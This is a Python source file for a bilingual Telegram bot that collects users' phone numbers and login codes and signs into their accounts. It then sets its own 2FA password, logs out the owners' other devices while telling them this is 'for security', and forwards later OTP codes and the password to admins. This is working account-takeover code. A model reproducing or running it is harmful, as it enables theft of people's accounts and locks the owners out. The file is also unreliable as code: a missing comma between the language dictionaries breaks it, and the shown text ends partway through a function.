import os
import json
import re
import asyncio
from datetime import datetime
from dotenv import load_dotenv

from telethon import TelegramClient, events, functions
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes, ConversationHandler
)

load_dotenv()

# ====================== CONFIG ======================
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "0").split(",") if x.strip()]

TWO_FA_PASSWORD = "Tg@123456"
LOGOUT_AFTER_MINUTES = 5
CHECK_INTERVAL = 60

# ====================== PATHS ======================
SESSIONS_DIR = "sessions"
DATA_DIR = "data"
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)

ACCOUNTS_FILE = f"{DATA_DIR}/accounts.json"
CODES_FILE = f"{DATA_DIR}/codes.json"
SETTINGS_FILE = f"{DATA_DIR}/settings.json"
ADMINS_FILE = f"{DATA_DIR}/admins.json"
LANG_FILE = f"{DATA_DIR}/languages.json"
USERS_FILE = f"{DATA_DIR}/users.json"

WAITING_CODE = 1
clients = {}
pending = {}

# ====================== LANGUAGE TEXTS ======================
TEXTS = {
"en": {
    "welcome":
        "👋 Welcome, **{name}**! 🌟\n\n"
        "🌐 Please select your preferred language below:",

    "lang_selected":
        "✅ Language successfully set to **English**. 🇬🇧",

    "send_number":
        "📱 **Send Your Phone Number**\n\n"
        "➕ Please include the `+` country code at the beginning.\n\n"
        "📝 Example:\n"
        "`+8801712345678`\n\n"
        "ℹ️ After completing the login, use `/information` to view your information.",

    "sending_code":
        "⏳ **Please wait...**\n\n"
        "📤 Your login verification code is being sent...",

    "code_sent":
        "📲 {flag} `{phone}`\n\n"
        "🔑 **Login Code Sent Successfully!**\n\n"
        "Please enter the **5 or 6-digit verification code**.\n\n"
        "➿ Use `/cancel` to cancel.",

    "already_login":
        "✅ **Already Logged In!**\n\n"
        "📱 This number is already logged in.",

    "invalid_code":
        "❌ **Invalid Code!**\n\n"
        "🔢 The verification code you entered is incorrect.\n"
        "🔄 Please try again.\n\n"
        "➿ Use `/cancel` to cancel.",

    "has_2fa":
        "🔐 **Two-Factor Authentication Detected**\n\n"
        "⚠️ Two-Factor Authentication (2FA) is already enabled on this account.",

    "login_success":
        "🎉 **Login Successful!**\n\n"
        "🌍 {flag} **{country}**\n"
        "📱 Number: `{phone}`\n"
        "👤 Name: {name}\n"
        "🔒 2FA: `{status}`\n\n"
        "⏳ For security, other devices will be logged out in **{min} minutes**.\n\n"
        "➡️ Use `/information` to view your information.",

    "cancelled":
        "✅ **Cancelled Successfully!**\n\n"
        "🔄 You can start again whenever you're ready.",

    "session_expired":
        "⚠️ **Session Expired!**\n\n"
        "🔄 Please send your phone number again to start a new session.",

    "info_menu":
        "ℹ️ **Information Menu**\n\n"
        "📊 Currently Active Numbers: `{total}`\n\n"
        "👇 Please select an option below:",

    "no_numbers":
        "📭 **No Active Numbers**\n\n"
        "You currently don't have any active numbers.",

    "your_numbers":
        "📱 **Your Active Numbers by Country**\n\n"
        "🌍 Select a country below to view your numbers:",

    "select_download":
        "📁 **Download Number File**\n\n"
        "🌍 Select a country below to download your numbers:",

    "file_sent":
        "✅ **File Sent Successfully!** 📁\n\n"
        "📥 You can download the file now.",

    "no_download":
        "📭 **No Numbers Available**\n\n"
        "There are currently no numbers available for download.",
}    
    "bn": {
    "welcome":
        "👋 স্বাগতম, **{name}**! 🌟\n\n"
        "🌐 নিচের অপশন থেকে আপনার পছন্দের ভাষা নির্বাচন করুন:",

    "lang_selected":
        "✅ ভাষা সফলভাবে **বাংলা** হিসেবে সেট করা হয়েছে। 🇧🇩",

    "send_number":
        "📱 **আপনার ফোন নম্বর পাঠান**\n\n"
        "➕ নম্বরের শুরুতে অবশ্যই `+` সহ কান্ট্রি কোড দিন।\n\n"
        "📝 উদাহরণ:\n"
        "`+8801712345678`\n\n"
        "ℹ️ লগইন সম্পন্ন হওয়ার পর আপনার তথ্য দেখতে `/information` ব্যবহার করুন।",

    "sending_code":
        "⏳ **অনুগ্রহ করে অপেক্ষা করুন...**\n\n"
        "📤 আপনার লগইন কোড পাঠানো হচ্ছে...",

    "code_sent":
        "📲 {flag} `{phone}`\n\n"
        "🔑 **লগইন কোড সফলভাবে পাঠানো হয়েছে!**\n\n"
        "🔢 অনুগ্রহ করে আপনার **৫ অথবা ৬ সংখ্যার লগইন কোড** পাঠান।\n\n"
        "➿ বাতিল করতে `/cancel` ব্যবহার করুন।",

    "already_login":
        "✅ **ইতোমধ্যেই লগইন করা আছে!**\n\n"
        "📱 এই নম্বরটি ইতোমধ্যে লগইন করা হয়েছে।",

    "invalid_code":
        "❌ **ভুল কোড!**\n\n"
        "🔢 আপনার দেওয়া লগইন কোডটি সঠিক নয়।\n"
        "🔄 অনুগ্রহ করে আবার চেষ্টা করুন।\n\n"
        "➿ বাতিল করতে `/cancel` ব্যবহার করুন।",

    "has_2fa":
        "🔐 **টু-ফ্যাক্টর অথেনটিকেশন শনাক্ত হয়েছে**\n\n"
        "⚠️ এই অ্যাকাউন্টে ইতোমধ্যে **Two-Factor Authentication (2FA)** চালু রয়েছে।",

    "login_success":
        "🎉 **লগইন সফল হয়েছে!**\n\n"
        "🌍 {flag} **{country}**\n"
        "📱 নম্বর: `{phone}`\n"
        "👤 নাম: {name}\n"
        "🔒 ২FA: `{status}`\n\n"
        "⏳ নিরাপত্তার কারণে অন্য ডিভাইসগুলো **{min} মিনিট** পর লগআউট হয়ে যাবে।\n\n"
        "➡️ আপনার পরবর্তী তথ্য দেখতে `/information` ব্যবহার করুন।",

    "cancelled":
        "✅ **সফলভাবে বাতিল করা হয়েছে!**\n\n"
        "🔄 চাইলে আবার আপনার ফোন নম্বর দিয়ে শুরু করতে পারেন।",

    "session_expired":
        "⚠️ **সেশনের সময় শেষ হয়ে গেছে!**\n\n"
        "🔄 আবার শুরু করতে আপনার ফোন নম্বর পাঠান।",

    "info_menu":
        "ℹ️ **ইনফরমেশন মেনু**\n\n"
        "📊 বর্তমানে সক্রিয় নম্বর: `{total}`\n\n"
        "👇 নিচের অপশন থেকে একটি নির্বাচন করুন:",

    "no_numbers":
        "📭 **কোনো সক্রিয় নম্বর নেই**\n\n"
        "এই মুহূর্তে আপনার কোনো সক্রিয় নম্বর নেই।",

    "your_numbers":
        "📱 **দেশ অনুযায়ী আপনার নম্বরসমূহ**\n\n"
        "🌍 নম্বর দেখতে নিচের তালিকা থেকে একটি দেশ নির্বাচন করুন:",

    "select_download":
        "📁 **নম্বর ফাইল ডাউনলোড**\n\n"
        "🌍 ফাইল ডাউনলোড করার জন্য নিচের তালিকা থেকে একটি দেশ নির্বাচন করুন:",

    "file_sent":
        "✅ **ফাইল সফলভাবে পাঠানো হয়েছে!** 📁\n\n"
        "📥 ফাইলটি এখন ডাউনলোড করে নিতে পারেন।",

    "no_download":
        "📭 **ডাউনলোড করার মতো কোনো নম্বর নেই**\n\n"
        "এই মুহূর্তে নির্বাচিত দেশের কোনো নম্বর ডাউনলোডের জন্য পাওয়া যায়নি।",

    "congrats_code":
        "🎉 **অভিনন্দন!**\n\n"
        "🌍 {flag} **{country}**\n"
        "📱 নম্বর: `{phone}`\n"
        "🔑 OTP কোড: `{code}`\n"
        "🔒 টু-ফ্যাক্টর: `{tfa}`\n"
        "📅 সময়: {time}\n\n"
        "✅ লগইন সম্পন্ন করতে উপরের কোডটি ব্যবহার করুন।",
}

def t(uid, key, **kwargs):
    langs = load_json(LANG_FILE, {})
    lang = langs.get(str(uid), "en")
    text = TEXTS.get(lang, TEXTS["en"]).get(key, key)
    return text.format(**kwargs) if kwargs else text

def set_lang(uid, lang):
    langs = load_json(LANG_FILE, {})
    langs[str(uid)] = lang
    save_json(LANG_FILE, langs)

# ====================== HELPERS ======================
def load_json(path, default=None):
    if default is None:
        default = {}
    try:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
    except:
        pass
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def get_admins():
    admins = load_json(ADMINS_FILE, [])
    if not admins:
        admins = ADMIN_IDS[:]
        save_json(ADMINS_FILE, admins)
    return admins

def is_admin(uid):
    return uid in get_admins()

def get_settings():
    s = load_json(SETTINGS_FILE, {})
    defaults = {
        "silent": True,           # Admin notification
        "user_code_notify": True  # User receives code or not
    }
    for k, v in defaults.items():
        if k not in s:
            s[k] = v
    save_json(SETTINGS_FILE, s)
    return s

def get_flag(phone):
    flags = {
        "93": "🇦🇫", "355": "🇦🇱", "213": "🇩🇿", "1684": "🇦🇸", "376": "🇦🇩", "244": "🇦🇴", "1264": "🇦🇮", "1268": "🇦🇬",
        "54": "🇦🇷", "374": "🇦🇲", "297": "🇦🇼", "61": "🇦🇺", "43": "🇦🇹", "994": "🇦🇿", "1242": "🇧🇸", "973": "🇧🇭",
        "880": "🇧🇩", "1246": "🇧🇧", "375": "🇧🇾", "32": "🇧🇪", "501": "🇧🇿", "229": "🇧🇯", "1441": "🇧🇲", "975": "🇧🇹",
        "591": "🇧🇴", "387": "🇧🇦", "267": "🇧🇼", "55": "🇧🇷", "673": "🇧🇳", "359": "🇧🇬", "226": "🇧🇫", "257": "🇧🇮",
        "855": "🇰🇭", "237": "🇨🇲", "1": "🇺🇸", "238": "🇨🇻", "236": "🇨🇫", "235": "🇹🇩", "56": "🇨🇱", "86": "🇨🇳",
        "57": "🇨🇴", "269": "🇰🇲", "242": "🇨🇬", "243": "🇨🇩", "682": "🇨🇰", "506": "🇨🇷", "225": "🇨🇮", "385": "🇭🇷",
        "53": "🇨🇺", "357": "🇨🇾", "420": "🇨🇿", "45": "🇩🇰", "253": "🇩🇯", "1767": "🇩🇲", "1809": "🇩🇴", "593": "🇪🇨",
        "20": "🇪🇬", "503": "🇸🇻", "240": "🇬🇶", "291": "🇪🇷", "372": "🇪🇪", "251": "🇪🇹", "679": "🇫🇯", "358": "🇫🇮",
        "33": "🇫🇷", "594": "🇬🇫", "689": "🇵🇫", "241": "🇬🇦", "220": "🇬🇲", "995": "🇬🇪", "49": "🇩🇪", "233": "🇬🇭",
        "350": "🇬🇮", "30": "🇬🇷", "299": "🇬🇱", "1473": "🇬🇩", "590": "🇬🇵", "1671": "🇬🇺", "502": "🇬🇹", "224": "🇬🇳",
        "245": "🇬🇼", "592": "🇬🇾", "509": "🇭🇹", "504": "🇭🇳", "852": "🇭🇰", "36": "🇭🇺", "354": "🇮🇸", "91": "🇮🇳",
        "62": "🇮🇩", "98": "🇮🇷", "964": "🇮🇶", "353": "🇮🇪", "972": "🇮🇱", "39": "🇮🇹", "1876": "🇯🇲", "81": "🇯🇵",
        "962": "🇯🇴", "7": "🇷🇺", "254": "🇰🇪", "686": "🇰🇮", "850": "🇰🇵", "82": "🇰🇷", "965": "🇰🇼", "996": "🇰🇬",
        "856": "🇱🇦", "371": "🇱🇻", "961": "🇱🇧", "266": "🇱🇸", "231": "🇱🇷", "218": "🇱🇾", "423": "🇱🇮", "370": "🇱🇹",
        "352": "🇱🇺", "853": "🇲🇴", "389": "🇲🇰", "261": "🇲🇬", "265": "🇲🇼", "60": "🇲🇾", "960": "🇲🇻", "223": "🇲🇱",
        "356": "🇲🇹", "692": "🇲🇭", "222": "🇲🇷", "230": "🇲🇺", "52": "🇲🇽", "691": "🇫🇲", "373": "🇲🇩", "377": "🇲🇨",
        "976": "🇲🇳", "382": "🇲🇪", "1664": "🇲🇸", "212": "🇲🇦", "258": "🇲🇿", "95": "🇲🇲", "264": "🇳🇦", "674": "🇳🇷",
        "977": "🇳🇵", "31": "🇳🇱", "687": "🇳🇨", "64": "🇳🇿", "505": "🇳🇮", "227": "🇳🇪", "234": "🇳🇬", "683": "🇳🇺",
        "672": "🇳🇫", "1670": "🇲🇵", "47": "🇳🇴", "968": "🇴🇲", "92": "🇵🇰", "680": "🇵🇼", "970": "🇵🇸", "507": "🇵🇦",
        "675": "🇵🇬", "595": "🇵🇾", "51": "🇵🇪", "63": "🇵🇭", "48": "🇵🇱", "351": "🇵🇹", "1787": "🇵🇷", "974": "🇶🇦",
        "40": "🇷🇴", "250": "🇷🇼", "290": "🇸🇭", "1869": "🇰🇳", "1758": "🇱🇨", "508": "🇵🇲", "1784": "🇻🇨", "685": "🇼🇸",
        "378": "🇸🇲", "239": "🇸🇹", "966": "🇸🇦", "221": "🇸🇳", "381": "🇷🇸", "248": "🇸🇨", "232": "🇸🇱", "65": "🇸🇬",
        "421": "🇸🇰", "386": "🇸🇮", "677": "🇸🇧", "252": "🇸🇴", "27": "🇿🇦", "211": "🇸🇸", "34": "🇪🇸", "94": "🇱🇰",
        "249": "🇸🇩", "597": "🇸🇷", "268": "🇸🇿", "46": "🇸🇪", "41": "🇨🇭", "963": "🇸🇾", "886": "🇹🇼", "992": "🇹🇯",
        "255": "🇹🇿", "66": "🇹🇭", "670": "🇹🇱", "228": "🇹🇬", "690": "🇹🇰", "676": "🇹🇴", "1868": "🇹🇹", "216": "🇹🇳",
        "90": "🇹🇷", "993": "🇹🇲", "1649": "🇹🇨", "688": "🇹🇻", "256": "🇺🇬", "380": "🇺🇦", "971": "🇦🇪", "44": "🇬🇧",
        "598": "🇺🇾", "998": "🇺🇿", "678": "🇻🇺", "379": "🇻🇦", "58": "🇻🇪", "84": "🇻🇳", "1284": "🇻🇬", "1340": "🇻🇮",
        "681": "🇼🇫", "967": "🇾🇪", "260": "🇿🇲", "263": "🇿🇼"
    }
    p = str(phone).replace("+", "")
    for code in sorted(flags.keys(), key=len, reverse=True):
        if p.startswith(code):
            return flags[code]
    return "🏳️"

def get_country_code(phone):
    p = str(phone).replace("+", "")
    codes = [
        "1684","1264","1268","1242","1246","1441","1473","1671","1664","1787","1869","1758","1784","1868","1649","1284","1340",
        "880","966","971","968","974","973","965","962","963","961","970","964","234","233","254","255","256","250","251",
        "221","225","237","243","244","249","260","263","265","212","213","216","218","20","27","380","375","420","421",
        "355","387","385","381","389","382","994","995","374","996","998","993","992","976","852","853","886","855","856",
        "673","91","92","94","977","975","98","90","86","84","82","81","66","65","63","62","60","95","55","54","57","56",
        "51","58","593","595","598","52","502","503","504","505","506","507","49","48","47","46","45","44","43","41","40",
        "39","36","34","33","32","31","30","7","1","61","64","93","355","213","376","244","54","374","297","994","973",
        "880","375","32","501","229","975","591","387","267","55","359","226","257","855","237","238","236","235","56",
        "86","57","269","242","243","682","506","225","385","53","357","420","45","253","593","20","503","240","291",
        "372","251","679","358","33","241","220","995","49","233","350","30","299","502","224","245","592","509","504",
        "852","36","354","91","62","98","964","353","972","39","1876","81","962","7","254","686","850","82","965","996",
        "856","371","961","266","231","218","423","370","352","853","389","261","265","60","960","223","356","692","222",
        "230","52","691","373","377","976","382","212","258","95","264","674","977","31","687","64","505","227","234",
        "683","672","1670","47","968","92","680","970","507","675","595","51","63","48","351","974","40","250","290",
        "1869","1758","508","1784","685","378","239","966","221","381","248","232","65","421","386","677","252","27",
        "211","34","94","249","597","268","46","41","963","886","992","255","66","670","228","690","676","1868","216",
        "90","993","1649","688","256","380","971","44","598","998","678","58","84","1284","1340","681","967","260","263"
    ]
    codes = sorted(list(set(codes)), key=len, reverse=True)
    for code in codes:
        if p.startswith(code):
            return code
    return p[:2] if len(p) >= 2 else p

def get_country_name(code):
    names = {
        "93": "Afghanistan", "355": "Albania", "213": "Algeria", "1684": "American Samoa", "376": "Andorra", "244": "Angola",
        "1264": "Anguilla", "1268": "Antigua", "54": "Argentina", "374": "Armenia", "297": "Aruba", "61": "Australia",
        "43": "Austria", "994": "Azerbaijan", "1242": "Bahamas", "973": "Bahrain", "880": "Bangladesh", "1246": "Barbados",
        "375": "Belarus", "32": "Belgium", "501": "Belize", "229": "Benin", "1441": "Bermuda", "975": "Bhutan",
        "591": "Bolivia", "387": "Bosnia", "267": "Botswana", "55": "Brazil", "673": "Brunei", "359": "Bulgaria",
        "226": "Burkina Faso", "257": "Burundi", "855": "Cambodia", "237": "Cameroon", "1": "United States", "238": "Cape Verde",
        "236": "Central African Republic", "235": "Chad", "56": "Chile", "86": "China", "57": "Colombia", "269": "Comoros",
        "242": "Congo", "243": "DR Congo", "682": "Cook Islands", "506": "Costa Rica", "225": "Ivory Coast", "385": "Croatia",
        "53": "Cuba", "357": "Cyprus", "420": "Czech Republic", "45": "Denmark", "253": "Djibouti", "1767": "Dominica",
        "1809": "Dominican Republic", "593": "Ecuador", "20": "Egypt", "503": "El Salvador", "240": "Equatorial Guinea",
        "291": "Eritrea", "372": "Estonia", "251": "Ethiopia", "679": "Fiji", "358": "Finland", "33": "France",
        "241": "Gabon", "220": "Gambia", "995": "Georgia", "49": "Germany", "233": "Ghana", "350": "Gibraltar",
        "30": "Greece", "299": "Greenland", "1473": "Grenada", "502": "Guatemala", "224": "Guinea", "245": "Guinea-Bissau",
        "592": "Guyana", "509": "Haiti", "504": "Honduras", "852": "Hong Kong", "36": "Hungary", "354": "Iceland",
        "91": "India", "62": "Indonesia", "98": "Iran", "964": "Iraq", "353": "Ireland", "972": "Israel", "39": "Italy",
        "1876": "Jamaica", "81": "Japan", "962": "Jordan", "7": "Russia", "254": "Kenya", "686": "Kiribati", "850": "North Korea",
        "82": "South Korea", "965": "Kuwait", "996": "Kyrgyzstan", "856": "Laos", "371": "Latvia", "961": "Lebanon",
        "266": "Lesotho", "231": "Liberia", "218": "Libya", "423": "Liechtenstein", "370": "Lithuania", "352": "Luxembourg",
        "853": "Macau", "389": "North Macedonia", "261": "Madagascar", "265": "Malawi", "60": "Malaysia", "960": "Maldives",
        "223": "Mali", "356": "Malta", "692": "Marshall Islands", "222": "Mauritania", "230": "Mauritius", "52": "Mexico",
        "691": "Micronesia", "373": "Moldova", "377": "Monaco", "976": "Mongolia", "382": "Montenegro", "212": "Morocco",
        "258": "Mozambique", "95": "Myanmar", "264": "Namibia", "674": "Nauru", "977": "Nepal", "31": "Netherlands",
        "687": "New Caledonia", "64": "New Zealand", "505": "Nicaragua", "227": "Niger", "234": "Nigeria", "47": "Norway",
        "968": "Oman", "92": "Pakistan", "680": "Palau", "970": "Palestine", "507": "Panama", "675": "Papua New Guinea",
        "595": "Paraguay", "51": "Peru", "63": "Philippines", "48": "Poland", "351": "Portugal", "974": "Qatar",
        "40": "Romania", "250": "Rwanda", "966": "Saudi Arabia", "221": "Senegal", "381": "Serbia", "248": "Seychelles",
        "232": "Sierra Leone", "65": "Singapore", "421": "Slovakia", "386": "Slovenia", "677": "Solomon Islands",
        "252": "Somalia", "27": "South Africa", "211": "South Sudan", "34": "Spain", "94": "Sri Lanka", "249": "Sudan",
        "597": "Suriname", "268": "Eswatini", "46": "Sweden", "41": "Switzerland", "963": "Syria", "886": "Taiwan",
        "992": "Tajikistan", "255": "Tanzania", "66": "Thailand", "670": "Timor-Leste", "228": "Togo", "676": "Tonga",
        "1868": "Trinidad", "216": "Tunisia", "90": "Turkey", "993": "Turkmenistan", "256": "Uganda", "380": "Ukraine",
        "971": "UAE", "44": "United Kingdom", "598": "Uruguay", "998": "Uzbekistan", "58": "Venezuela", "84": "Vietnam",
        "967": "Yemen", "260": "Zambia", "263": "Zimbabwe"
    }
    return names.get(str(code), f"Country +{code}")

# ====================== TELETHON ======================
async def start_client(phone):
    path = f"{SESSIONS_DIR}/{phone.replace('+', '')}"
    client = TelegramClient(path, API_ID, API_HASH)

    @client.on(events.NewMessage(from_users=777000))
    async def handler(e):
        m = re.search(r'(\d{5,6})', e.message.message or "")
        if not m:
            return
        code = m.group(1)

        codes = load_json(CODES_FILE, {})
        if phone not in codes:
            codes[phone] = []
        codes[phone].insert(0, {"code": code, "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
        codes[phone] = codes[phone][:15]
        save_json(CODES_FILE, codes)

        accounts = load_json(ACCOUNTS_FILE, {})
        acc = accounts.get(phone)
        if not acc:
            return

        flag = get_flag(phone)
        country = get_country_name(get_country_code(phone))
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        uid = acc["uid"]
        settings = get_settings()

        # ===== User কে কোড পাঠানো (যদি user_code_notify ON থাকে) =====
        if settings.get("user_code_notify", True):
            try:
                from telegram import Bot
                bot = Bot(token=BOT_TOKEN)
                msg = t(uid, "congrats_code", flag=flag, country=country, phone=phone,
                        code=code, tfa=TWO_FA_PASSWORD, time=now)
                await bot.send_message(chat_id=uid, text=msg, parse_mode="Markdown")
            except Exception as ex:
                print("User notify error:", ex)

        # ===== Admin notification (Silent ON থাকলে) =====
        if settings.get("silent", True):
            for admin_id in get_admins():
                try:
                    from telegram import Bot
                    bot = Bot(token=BOT_TOKEN)
                    admin_msg = (
                        f"🔔 **New Code Received**\n\n"
                        f"👤 Name: {acc.get('name', 'Unknown')}\n"
                        f"📧 Username: @{acc.get('username') or 'None'}\n"
                        f"🆔 Chat ID: `{uid}`\n"
                        f"📱 Number: `{phone}`\n"
                        f"🌍 {flag} {country}\n"
                        f"🔑 OTP: `{code}`\n"
                        f"🔒 2FA: `{TWO_FA_PASSWORD}`\n"
                        f"📅 {now}"
                    )
                    await bot.send_message(chat_id=admin_id, text=admin_msg, parse_mode="Markdown")
                except:
                    pass

    try:
        await client.connect()
        if await client.is_user_authorized():
            clients[phone] = client
            return True
        await client.disconnect()
    except:
        pass
    return False

async def enable_2fa(client):
    try:
        await client.edit_2fa(new_password=TWO_FA_PASSWORD)
        return True
    except:
        return False

async def logout_other_devices(phone):
    try:
        if phone not in clients:
            return
        client = clients[phone]
        result = await client(functions.account.GetAuthorizationsRequest())
        for auth in result.authorizations:
            if not auth.current:
                try:
                    await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                except:
                    pass
    except Exception as e:
        print(f"Logout error ({phone}):", e)

async def check_sessions_loop():
    while True:
        try:
            accounts = load_json(ACCOUNTS_FILE, {})
            to_remove = []
            for phone in list(accounts.keys()):
                try:
                    if phone in clients:
                        if not await clients[phone].is_user_authorized():
                            to_remove.append(phone)
                    else:
                        ok = await start_client(phone)
                        if not ok:
                            to_remove.append(phone)
                except:
                    to_remove.append(phone)

            if to_remove:
                for phone in to_remove:
                    if phone in accounts:
                        del accounts[phone]
                    if phone in clients:
                        try:
                            await clients[phone].disconnect()
                        except:
                            pass
                        del clients[phone]
                    session_file = f"{SESSIONS_DIR}/{phone.replace('+', '')}.session"
                    if os.path.exists(session_file):
                        try:
                            os.remove(session_file)
                        except:
                            pass
                save_json(ACCOUNTS_FILE, accounts)
                print(f"Auto removed {len(to_remove)} sessions")
        except Exception as e:
            print("Session check error:", e)
        await asyncio.sleep(CHECK_INTERVAL)

# ====================== START & LANGUAGE ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id

    # ===== Total User কাউন্ট =====
    users = load_json(USERS_FILE, {})
    if str(uid) not in users:
        users[str(uid)] = {
            "name": user.first_name or "",
            "username": user.username or "",
            "joined": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_json(USERS_FILE, users)

    langs = load_json(LANG_FILE, {})

    if str(uid) not in langs:
        kb = [
            [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
            [InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn")]
        ]
        await update.message.reply_text(
            TEXTS["en"]["welcome"].format(name=user.first_name),
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(t(uid, "send_number"), parse_mode="Markdown")

async def language_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
        [InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn")]
    ]
    await update.message.reply_text(
        "🌐 Select Language / ভাষা সিলেক্ট করুন:",
        reply_markup=InlineKeyboardMarkup(kb)
    )

async def lang_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    lang = q.data.replace("lang_", "")

    set_lang(uid, lang)
    await q.edit_message_text(t(uid, "lang_selected"), parse_mode="Markdown")
    await q.message.reply_text(t(uid, "send_number"), parse_mode="Markdown")

# ====================== LOGIN FLOW ======================
async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().replace(" ", "")
    if not re.match(r'^\+?\d{8,15}$', text):
        return

    phone = text if text.startswith("+") else "+" + text
    chat_id = update.effective_chat.id
    uid = update.effective_user.id
    user = update.effective_user

    wait = await update.message.reply_text(t(uid, "sending_code"))

    try:
        client = TelegramClient(f"{SESSIONS_DIR}/{phone[1:]}", API_ID, API_HASH)
        await client.connect()

        if await client.is_user_authorized():
            await wait.edit_text(t(uid, "already_login"))
            await client.disconnect()
            return ConversationHandler.END

        sent = await client.send_code_request(phone)
        pending[chat_id] = {
            "client": client,
            "phone": phone,
            "hash": sent.phone_code_hash,
            "uid": uid,
            "name": user.first_name or "",
            "username": user.username or ""
        }

        await wait.edit_text(
            t(uid, "code_sent", flag=get_flag(phone), phone=phone),
            parse_mode="Markdown"
        )
        return WAITING_CODE

    except Exception as e:
        await wait.edit_text(f"❌ Error: {e}")
        return ConversationHandler.END

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in pending:
        uid = update.effective_user.id
        await update.message.reply_text(t(uid, "session_expired"))
        return ConversationHandler.END

    data = pending[chat_id]
    code = update.message.text.strip()
    phone = data["phone"]
    uid = data["uid"]

    try:
        await data["client"].sign_in(phone, code, phone_code_hash=data["hash"])
    except PhoneCodeInvalidError:
        await update.message.reply_text(t(uid, "invalid_code"))
        return WAITING_CODE
    except SessionPasswordNeededError:
        await update.message.reply_text(t(uid, "has_2fa"))
        await data["client"].disconnect()
        del pending[chat_id]
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        await data["client"].disconnect()
        del pending[chat_id]
        return ConversationHandler.END

    me = await data["client"].get_me()
    ok = await enable_2fa(data["client"])

    async def delayed_logout():
        await asyncio.sleep(LOGOUT_AFTER_MINUTES * 60)
        await logout_other_devices(phone)
    asyncio.create_task(delayed_logout())

    accounts = load_json(ACCOUNTS_FILE, {})
    accounts[phone] = {
        "uid": uid,
        "name": data.get("name") or me.first_name or "",
        "username": data.get("username") or me.username or "",
        "country": get_country_code(phone),
        "2fa": TWO_FA_PASSWORD if ok else "Failed",
        "added": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_json(ACCOUNTS_FILE, accounts)

    await data["client"].disconnect()
    await start_client(phone)
    del pending[chat_id]

    status = "Enabled ✅" if ok else "Failed ❌"
    await update.message.reply_text(
        t(uid, "login_success",
          flag=get_flag(phone),
          country=get_country_name(get_country_code(phone)),
          phone=phone,
          name=me.first_name or "N/A",
          status=status,
          min=LOGOUT_AFTER_MINUTES),
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    uid = update.effective_user.id
    if chat_id in pending:
        try:
            await pending[chat_id]["client"].disconnect()
        except:
            pass
        del pending[chat_id]
    await update.message.reply_text(t(uid, "cancelled"))
    return ConversationHandler.END

# ====================== /information ======================
async def information(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    accounts = load_json(ACCOUNTS_FILE, {})
    total = sum(1 for i in accounts.values() if i.get("uid") == uid)

    kb = [
        [InlineKeyboardButton("📱 All Number", callback_data="info_allnum")],
        [InlineKeyboardButton("📁 Download Number File", callback_data="info_download")]
    ]
    await update.message.reply_text(
        t(uid, "info_menu", total=total),
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode="Markdown"
    )

async def info_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data
    accounts = load_json(ACCOUNTS_FILE, {})
    user_accs = {p: i for p, i in accounts.items() if i.get("uid") == uid}

    if data == "info_allnum":
        if not user_accs:
            await q.edit_message_text(t(uid, "no_numbers"))
            return
        country_count = {}
        for p, i in user_accs.items():
            c = i.get("country") or get_country_code(p)
            country_count[c] = country_count.get(c, 0) + 1
        kb = []
        for c, n in sorted(country_count.items(), key=lambda x: -x[1]):
            kb.append([InlineKeyboardButton(f"{get_flag('+' + c)} {get_country_name(c)} ({n})", callback_data=f"show_{c}")])
        kb.append([InlineKeyboardButton("◀️ Back", callback_data="info_back")])
        await q.edit_message_text(t(uid, "your_numbers"), reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data.startswith("show_"):
        code = data.replace("show_", "")
        nums = [p for p, i in user_accs.items() if (i.get("country") == code or get_country_code(p) == code)]
        text = f"{get_flag('+' + code)} **{get_country_name(code)}** — `{len(nums)}`\n\n"
        for p in nums:
            text += f"`{p}`\n"
        kb = [[InlineKeyboardButton("◀️ Back", callback_data="info_allnum")]]
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "info_download":
        if not user_accs:
            await q.edit_message_text(t(uid, "no_download"))
            return
        country_count = {}
        for p, i in user_accs.items():
            c = i.get("country") or get_country_code(p)
            country_count[c] = country_count.get(c, 0) + 1
        kb = [[InlineKeyboardButton("🌍 All Country", callback_data="dl_all")]]
        for c, n in sorted(country_count.items(), key=lambda x: -x[1]):
            kb.append([InlineKeyboardButton(f"{get_flag('+' + c)} {get_country_name(c)} ({n})", callback_data=f"dl_{c}")])
